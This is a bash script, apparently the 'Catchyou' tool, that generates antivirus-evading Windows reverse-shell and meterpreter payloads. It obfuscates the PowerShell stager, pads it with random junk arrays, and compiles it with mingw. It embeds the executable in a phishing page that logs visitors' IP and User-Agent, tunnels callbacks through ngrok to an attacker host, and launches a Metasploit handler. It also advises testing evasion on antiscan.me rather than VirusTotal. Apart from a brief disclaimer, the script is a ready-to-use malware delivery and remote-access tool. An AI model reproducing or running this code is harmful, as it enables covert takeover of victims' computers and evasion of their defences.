#!/bin/bash
# Catchyou v1.1 - FUD Win MSFVenom Payload Generator
# coded by: github.com/thelinuxchoice/catchyou
# twitter: @linux_choice
# You can use any part from this code, giving me the credits. You should have received a copy of the GNU General Public License along with this program. If not, see http://www.gnu.org/licenses/.

trap 'printf "\n";stop' 2
server_tcp="0.tcp.ngrok.io" #NGROK IP


banner() {

printf "\e[1;91m   _________         __         .__     \e[0m\e[1;93m                      \e[0m \n"
printf "\e[1;91m   \_   ___ \_____ _/  |_  ____ |  |__  \e[0m\e[1;93m  ___.__. ____  __ __  \e[0m\n"
printf "\e[1;91m   /    \  \/\__  \    __\/ ___\|  |  \ \e[0m\e[1;93m <   |  |/  _ \|  |  \ \e[0m\n"
printf "\e[1;91m   \     \____/ __ \|  | \  \___|   Y  \  \e[0m\e[1;93m\___  (  <_> )  |  / \e[0m\n"
printf "\e[1;91m    \______  (____  /__|  \___  >___|  / \e[0m\e[1;93m / ____|\____/|____/  \e[0m\n"
printf "\e[1;91m           \/     \/          \/     \/  \e[0m\e[1;93m \/                   \e[0m\n"

printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[1;31m           FUD Win MSFVenom Payload Generator  \e[0m        \e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]              v1.1 coded by @linux_choice              \e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]           github.com/thelinuxchoice/catchyou          \e[0m\e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
printf "\n"
printf "        \e[1;91m Disclaimer: this tool is designed for security\n"
printf "         testing in an authorized simulated cyberattack\n"
printf "         Attacking targets without prior mutual consent\n"
printf "         is illegal!\n"

}




stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
#checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
#if [[ $checkssh == *'ssh'* ]]; then
#killall -2 ssh > /dev/null 2>&1
#fi
exit 1

}

dependencies() {

command -v msfvenom > /dev/null 2>&1 || { echo >&2 "I require msfvenom but it's not installed. Install it or use Kali Linux."; exit 1; }
command -v i686-w64-mingw32-gcc > /dev/null 2>&1 || { echo >&2 "I require mingw-w64 but it's not installed. Install it: apt-get update && apt-get install mingw-w64"; 
exit 1; }
command -v base64 > /dev/null 2>&1 || { echo >&2 "I require base64 but it's not installed. Install it. Aborting."; exit 1; }
command -v zip > /dev/null 2>&1 || { echo >&2 "I require Zip but it's not installed. Install it. Aborting."; exit 1; }
command -v netcat > /dev/null 2>&1 || { echo >&2 "I require netcat but it's not installed. Install it. Aborting."; exit 1; } 

}


ngrok_server() {

if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
arch3=$(uname -a | grep -o 'amd64' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

elif [[ $arch3 == *'amd64'* ]] ; then

wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-amd64.zip ]]; then
unzip ngrok-stable-linux-amd64.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-amd64.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server (port 3333)...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2

if [[ -e check_ngrok ]]; then
rm -rf ngrok_check
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\e[0m\n"
./ngrok tcp 4444 > /dev/null 2>&1 > check_ngrok &
sleep 10

check_ngrok=$(grep -o 'ERR_NGROK_302' check_ngrok)

if [[ ! -z $check_ngrok ]];then
printf "\n\e[91mAuthtoken missing!\e[0m\n"
printf "\e[77mSign up at: https://ngrok.com/signup\e[0m\n"
printf "\e[77mYour authtoken is available on your dashboard: https://dashboard.ngrok.com\n\e[0m"
printf "\e[77mInstall your auhtoken:\e[0m\e[93m ./ngrok authtoken <YOUR_AUTHTOKEN>\e[0m\n\n"
rm -rf check_ngrok
exit 1
fi

if [[ -e check_ngrok ]]; then
rm -rf check_ngrok
fi

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "tcp://0.tcp.ngrok.io:[0-9]*")

if [[ ! -z $link ]]; then 
printf "\e[1;92m[\e[0m*\e[1;92m] Forwarding from:\e[0m\e[1;77m %s\e[0m\n" $link
else
printf "\n\e[91mNgrok Error!\e[0m\n"
exit 1
fi

}


settings2() {

default_payload_name="catchyou"
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Payload name (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_payload_name

read payload_name
payload_name="${payload_name:-${default_payload_name}}"
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Redirect page (after delivering payload): \e[0m' redirect_url
redirect_url="${redirect_url:-${default_redirect_url}}"

}

start() {

if [[ -e ip.txt ]]; then
rm -f ip.txt
fi
msf_venom
printf "\n"
printf " \e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok.io:\e[0m\n"
printf " \e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Custom LPORT/LHOST:\e[0m\n"
default_option_server="1"
default_redirect_url="https://www.google.com"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a reverse TCP Port Forwarding option: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"

if [[ $option_server -eq 1 ]]; then

command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
forward=true
#settings
settings2
ngrok_server
#server
payload
#direct_link
listener
elif [[ $option_server -eq 2 ]]; then
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] LHOST: \e[0m' custom_ip
if [[ -z "$custom_ip" ]]; then
exit 1
fi
server_tcp=$custom_ip
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] LPORT: \e[0m' custom_port
if [[ -z "$custom_port" ]]; then
exit 1
fi
server_port=$custom_port
settings2
payload
listener
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
start
fi

}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
device=$(grep -o 'User-Agent:.*' ip.txt | cut -d ":" -f2)
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $device
cat ip.txt >> saved.ip.txt
rm -f ip.txt
}

listener() {

if [[ $forward == true ]];then
printf "\n\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m]\e[1;91m Expose the server with command: \e[0m\n"
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m]\e[0m\e[93m ssh -R 80:localhost:3333 custom-subdomain@ssh.localhost.run \e[0m\n"
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m]\e[0m\e[92m Use \e[0m\e[77mhttps://server/%s.exe\e[0m\e[92m to deliver the direct file \e[0m\n" $payload_name
checkfound
else


default_listr="Y"
read -p $'\n\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Start Metasploit Listener? \e[0m\e[1;77m[Y/n]\e[0m\e[1;33m: \e[0m' listr
listr="${listr:-${default_listr}}"
if [[ $listr == Y || $listr == y || $listr == Yes || $listr == yes ]]; then
printf "use exploit/multi/handler\n" > handler.rc
printf "set payload %s\n" $payload_msf >> handler.rc
if [[ $forward == true ]];then
printf "set LHOST 127.0.0.1\n" >> handler.rc
else
printf "set LHOST %s\n" $server_tcp >> handler.rc
fi
printf "set LPORT %s\n" $server_port >> handler.rc
#printf "set ExitOnSession false\n" >> handler.rc
#printf "exploit -j -z\n" >> handler.rc
printf "exploit\n" >> handler.rc
msfconsole -r handler.rc
rm -rf handler.rc
fi
fi
}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do

if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
#
default_listr="Y"
read -p $'\n\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Start Metasploit Listener? \e[0m\e[1;77m[Y/n]\e[0m\e[1;33m: \e[0m' listr
listr="${listr:-${default_listr}}"
if [[ $listr == Y || $listr == y || $listr == Yes || $listr == yes ]]; then
printf "use exploit/multi/handler\n" > handler.rc
printf "set payload %s\n" $payload_msf >> handler.rc
if [[ $forward == true ]];then
printf "set LHOST 127.0.0.1\n" >> handler.rc
else
printf "set LHOST %s\n" $server_tcp >> handler.rc
fi

printf "set LPORT 4444\n" >> handler.rc
#printf "set ExitOnSession false\n" >> handler.rc
#printf "exploit -j -z\n" >> handler.rc
printf "exploit\n" >> handler.rc
msfconsole -r handler.rc
rm -rf handler.rc
fi


#
fi
done
sleep 0.5

}

msf_venom() {


printf "\n\e[1;33m[\e[0m\e[1;31m01\e[0m\e[1;33m]\e[0m\e[1;77m windows/meterpreter/reverse_tcp\e[0m\n" 
printf "\e[1;33m[\e[0m\e[1;31m02\e[0m\e[1;33m]\e[0m\e[1;77m windows/shell/reverse_tcp\e[0m\n"
#printf "\e[1;33m[\e[0m\e[1;31m03\e[0m\e[1;33m]\e[0m\e[1;77m windows/x64/meterpreter/reverse_tcp\e[0m\n"
#printf "\e[1;33m[\e[0m\e[1;31m04\e[0m\e[1;33m]\e[0m\e[1;77m windows/x64/shell/reverse_tcp\e[0m\n"



read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a payload: \e[0m' payload_option;
Y="rm"
if [[ $payload_option -eq 1 ]];then
payload_msf="windows/meterpreter/reverse_tcp"
elif [[ $payload_option -eq 2 ]];then
payload_msf="windows/shell/reverse_tcp"
#elif [[ $payload_option -eq 3 ]];then
#payload_msf="windows/x64/meterpreter/reverse_tcp"
#elif [[ $payload_option -eq 4 ]];then
#payload_msf="windows/x64/shell/reverse_tcp"
else

printf "\e[1;91mInvalid!\e[0m\n"
sleep 1
msf_venom
fi



}

function generatePadding {

    paddingArray=(0 1 2 3 4 5 6 7 8 9 a b c d e f)

    counter=0
    randomNumber=$((RANDOM%${randomness}+15))
    while [  $counter -lt $randomNumber ]; do
        echo ""
	randomCharnameSize=$((RANDOM%10+32))
        randomCharname=`cat /dev/urandom | tr -dc 'a-zA-Z' | head -c ${randomCharnameSize}`
	echo "unsigned char ${randomCharname}[]="
    	randomLines=$((RANDOM%20+13))
	for (( c=1; c<=$randomLines; c++ ))
	do
		randomString="\""
		randomLength=$((RANDOM%11+32))
		for (( d=1; d<=$randomLength; d++ ))
		do
			randomChar1=${paddingArray[$((RANDOM%15))]}
			randomChar2=${paddingArray[$((RANDOM%15))]}
			randomPadding=$randomChar1$randomChar2
	        	randomString="$randomString\\x$randomPadding"
		done
		randomString="$randomString\""
		if [ $c -eq ${randomLines} ]; then
			echo "$randomString;"
		else
			echo $randomString
		fi
	done
        let counter=counter+1
    done
}

payload() {


q="c";z=".";

if [[ $forward == true ]];then
server_port=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "tcp://0.tcp.ngrok.io:[0-9]*" | cut -d ':' -f3)
fi

printf "\e[1;77m[\e[0m\e[1;33m::\e[0m\e[1;77m] Creating MSFVenom payload\e[0m\n"; X="1"

msfvenom -p $payload_msf LHOST=$server_tcp LPORT=$server_port -f psh-cmd -o $payload_name.bat > /dev/null 2>&1
if [[ $(cat "$payload_name".bat) == "" ]]; then
printf "\e[91mMSFVenom Error!\e[0m\n"
rm -rf $payload_name.bat
exit 1
fi

enc=$z$q 
msf=$(cat $payload_name.bat | sed 's/\%COMSPEC\% \/b \/c //g' |sed 's/\//\\\//g' | sed 's/powershell/p^o^wer^sh^ell/g')

sed -f - src/src2.c > $X.$q << EOF
s/payload/${msf}/g
EOF

generatePadding > padding.c

cat src/src1.c > $X
cat padding.c >> $X
generatePadding > padding.c
cat padding.c >> $X
generatePadding > padding.c
cat padding.c >> $X
generatePadding > padding.c
cat padding.c >> $X
generatePadding > padding.c
cat padding.c >> $X


cat $X.$q >> $X

generatePadding > padding.c
cat padding.c >> $X
generatePadding > padding.c
cat padding.c >> $X
generatePadding > padding.c
cat padding.c >> $X
generatePadding > padding.c
cat padding.c >> $X
rm -rf padding.c
mv $X $X.c



rm -rf $payload_name.bat
printf "\e[1;77m[\e[0m\e[1;33m::\e[0m\e[1;77m] Building payload\e[0m\n"
i686-w64-mingw32-gcc $X$enc -o "$payload_name".exe 
if [ -e "$payload_name".exe ]; then
if [ ! -d payloads/"$payload_name"/ ]; then
IFS=$'\n'
mkdir -p payloads/"$payload_name/"
fi
cp "$payload_name".exe payloads/"$payload_name"/"$payload_name".exe
$Y -r $X.$q
#zip $payload_name.zip "$payload_name".exe > /dev/null 2>&1
IFS=$'\n'
data_base64=$(base64 -w 0 $payload_name.exe)
temp64="$( echo "${data_base64}" | sed 's/[\\&*./+!]/\\&/g' )"

printf "\e[1;77m[\e[0m\e[1;33m::\e[0m\e[1;77m] Converting binary to base64\e[0m\n" 
printf "\e[1;77m[\e[0m\e[1;33m::\e[0m\e[1;77m] Injecting Data URI code into index.php\e[0m\n"
sed 's+url_website+'$redirect_url'+g' src/template.html | sed 's+payload_name+'$payload_name'+g'  > src/temp
sed -f - src/temp > index.php << EOF
s/data_base64/${temp64}/g
EOF
rm -rf src/temp > /dev/null 2>&1

printf "\e[1;93m[\e[0m\e[1;77m::\e[0m\e[1;93m]\e[0m\e[1;91m Payload saved:\e[0m\e[1;77m payloads/%s.exe\e[0m\n" $payload_name
printf '\e[1;93m[\e[0m\e[1;77m::\e[0m\e[1;93m]\e[0m\e[1;93m Please,\e[0m\e[1;91m do not upload to VirusTotal\e[0m\n'
printf '\e[1;93m[\e[0m\e[1;77m::\e[0m\e[1;93m]\e[0m\e[1;92m Check your file at\e[0m\e[1;77m https://antiscan.me\e[0m\n'
else
printf "\e[1;93mError compiling\e[0m\n"
exit 1
fi

}

banner
dependencies
start

